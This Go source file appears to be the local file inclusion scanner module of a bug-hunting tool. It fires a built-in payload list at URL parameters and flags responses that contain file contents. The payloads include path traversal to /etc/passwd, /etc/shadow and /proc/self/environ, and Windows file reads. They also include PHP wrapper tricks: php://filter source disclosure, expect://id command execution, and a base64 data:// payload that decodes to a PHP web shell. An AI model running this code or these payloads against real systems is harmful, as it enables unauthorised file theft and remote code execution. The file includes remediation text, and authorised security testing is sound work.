package lfi

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/a0x194/recon-hunter/internal/config"
	"github.com/a0x194/recon-hunter/internal/types"
	"github.com/a0x194/recon-hunter/internal/utils"
)

// LFI payloads for testing
var lfiPayloads = []struct {
	payload   string
	os        string
	indicator string
}{
	// Linux
	{"../../../etc/passwd", "linux", "root:"},
	{"....//....//....//etc/passwd", "linux", "root:"},
	{"..%2f..%2f..%2fetc/passwd", "linux", "root:"},
	{"..%252f..%252f..%252fetc/passwd", "linux", "root:"},
	{"/etc/passwd", "linux", "root:"},
	{"....//....//....//....//etc/passwd", "linux", "root:"},
	{"..\\..\\..\\etc\\passwd", "linux", "root:"},
	{"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "linux", "root:"},
	{"....//....//....//....//....//etc/passwd", "linux", "root:"},
	{"/etc/passwd%00", "linux", "root:"},
	{"../../../etc/passwd%00.jpg", "linux", "root:"},
	{"/etc/shadow", "linux", "root:"},
	{"/etc/hosts", "linux", "localhost"},
	{"/proc/self/environ", "linux", "PATH="},
	{"/proc/version", "linux", "Linux version"},
	{"/proc/self/cmdline", "linux", ""},
	{"../../../var/log/apache2/access.log", "linux", "GET"},
	{"../../../var/log/nginx/access.log", "linux", "GET"},

	// Windows
	{"..\\..\\..\\windows\\win.ini", "windows", "[fonts]"},
	{"....\\\\....\\\\....\\\\windows\\\\win.ini", "windows", "[fonts]"},
	{"..%5c..%5c..%5cwindows%5cwin.ini", "windows", "[fonts]"},
	{"C:\\windows\\win.ini", "windows", "[fonts]"},
	{"C:/windows/win.ini", "windows", "[fonts]"},
	{"/windows/win.ini", "windows", "[fonts]"},
	{"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows", "localhost"},
	{"C:\\boot.ini", "windows", "[boot loader]"},
	{"..\\..\\..\\boot.ini", "windows", "[boot loader]"},

	// PHP wrappers
	{"php://filter/convert.base64-encode/resource=/etc/passwd", "php", ""},
	{"php://filter/convert.base64-encode/resource=index.php", "php", ""},
	{"php://input", "php", ""},
	{"expect://id", "php", "uid="},
	{"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "php", ""},

	// Null byte injection (older PHP)
	{"../../../etc/passwd%00", "linux", "root:"},
	{"../../../etc/passwd%00.jpg", "linux", "root:"},
	{"../../../etc/passwd%00.php", "linux", "root:"},
}

// Scan performs LFI scanning
func Scan(urls []string, cfg *config.Config) ([]types.VulnResult, error) {
	var results []types.VulnResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	client := utils.HTTPClient(cfg.Timeout, cfg.Proxy, true)
	sem := make(chan struct{}, cfg.Threads)

	// LFI-prone parameter names
	lfiParams := []string{
		"file", "path", "page", "include", "document", "folder", "root",
		"pg", "style", "pdf", "template", "php_path", "doc", "img",
		"filename", "filepath", "loc", "location", "dir", "conf",
		"view", "content", "cont", "load", "read", "cat", "action",
	}

	for _, urlStr := range urls {
		if !utils.HasParam(urlStr) {
			continue
		}

		parsedURL, err := url.Parse(urlStr)
		if err != nil {
			continue
		}

		params := parsedURL.Query()
		hasLFIParam := false
		for param := range params {
			paramLower := strings.ToLower(param)
			for _, lfiParam := range lfiParams {
				if strings.Contains(paramLower, lfiParam) {
					hasLFIParam = true
					break
				}
			}
		}

		if !hasLFIParam {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vulns := testLFI(u, client)
			if len(vulns) > 0 {
				mu.Lock()
				results = append(results, vulns...)
				mu.Unlock()
			}
		}(urlStr)
	}

	wg.Wait()
	return results, nil
}

func testLFI(urlStr string, client *http.Client) []types.VulnResult {
	var results []types.VulnResult

	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return nil
	}

	params := parsedURL.Query()

	for param := range params {
		for _, test := range lfiPayloads {
			result := testPayload(urlStr, param, test.payload, test.os, test.indicator, client)
			if result != nil {
				results = append(results, *result)
				break // Found LFI for this param
			}
		}
	}

	return results
}

func testPayload(urlStr, param, payload, os, indicator string, client *http.Client) *types.VulnResult {
	parsedURL, _ := url.Parse(urlStr)
	originalParams := parsedURL.Query()

	testParams := url.Values{}
	for k, v := range originalParams {
		testParams[k] = v
	}
	testParams.Set(param, payload)

	parsedURL.RawQuery = testParams.Encode()
	testURL := parsedURL.String()

	resp, err := client.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	bodyStr := string(body)

	// Check for indicator
	if indicator != "" && strings.Contains(bodyStr, indicator) {
		return &types.VulnResult{
			Type:        "Local File Inclusion (LFI)",
			Severity:    "critical",
			URL:         urlStr,
			Parameter:   param,
			Payload:     payload,
			Evidence:    truncateEvidence(bodyStr, indicator),
			Description: fmt.Sprintf("LFI vulnerability detected. Target OS: %s", os),
			Remediation: "Never include files based on user input. Use a whitelist of allowed files. Disable allow_url_include in PHP.",
			References: []string{
				"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
			},
		}
	}

	// Check for PHP wrapper (base64)
	if strings.HasPrefix(payload, "php://filter") && len(bodyStr) > 50 {
		// Check if response looks like base64
		if isBase64(bodyStr) {
			return &types.VulnResult{
				Type:        "Local File Inclusion (LFI) - PHP Filter",
				Severity:    "critical",
				URL:         urlStr,
				Parameter:   param,
				Payload:     payload,
				Evidence:    fmt.Sprintf("Base64 encoded response (length: %d)", len(bodyStr)),
				Description: "LFI vulnerability via PHP filter wrapper. Source code disclosure possible.",
				Remediation: "Disable PHP wrappers. Use a whitelist of allowed files.",
				References: []string{
					"https://www.php.net/manual/en/wrappers.php.php",
				},
			}
		}
	}

	return nil
}

func truncateEvidence(body, indicator string) string {
	idx := strings.Index(body, indicator)
	if idx == -1 {
		return ""
	}

	start := idx - 50
	if start < 0 {
		start = 0
	}
	end := idx + len(indicator) + 100
	if end > len(body) {
		end = len(body)
	}

	return "..." + body[start:end] + "..."
}

func isBase64(s string) bool {
	s = strings.TrimSpace(s)
	if len(s) < 20 {
		return false
	}

	// Check for base64 characters
	validChars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
	for _, c := range s {
		if !strings.ContainsRune(validChars, c) && c != '\n' && c != '\r' {
			return false
		}
	}

	return true
}
